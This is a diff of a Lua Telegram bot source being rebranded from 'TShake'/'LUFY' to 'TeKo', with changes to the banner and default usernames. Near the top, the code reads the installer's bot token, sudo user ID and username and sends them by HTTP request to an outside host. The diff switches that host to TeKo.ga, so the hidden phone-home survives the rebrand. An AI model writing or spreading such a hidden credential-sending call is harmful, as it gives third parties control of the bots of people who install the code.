@@ -69,8 +69,8 @@ end
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
-res = https.request('http://Tshake.ga/TeKo/TeKo.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
-print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
+res = https.request('http://TeKo.ga/TeKo/TeKo.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
+print('\n\27[1;34m done send :')
 file = io.open("TeKo", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -137,10 +137,15 @@ end
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
+ _____    _____    _  __    ___
+|_   _|  | ____|  | |/ /   / _ \
+  | |    |  _|    | ' /   | | | |
+  | |    | |___   | . \   | |_| |
+  |_|    |_____|  |_|\_\   \___/
+  
+>> Best Source in Telegram
+>> Features fast and powerful
 
-
-LUFY TEAM
-~> DEVELOPER › @BB63BB
 ]])
 sudos = dofile("./Info.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -3559,7 +3564,7 @@ if b.first_name_ == false then
 send(msg.chat_id_, msg.id_,"⚠️┇حساب المنشئ محذوف")
 return false  
 end
-local UserName = (b.username_ or "TSHAKETEAM")
+local UserName = (b.username_ or "TeKoTEAM")
 send(msg.chat_id_, msg.id_,"👁️‍🗨️┇منشئ المجموعه ← ["..b.first_name_.."](T.me/"..UserName..")")  
 end,nil)   
 end
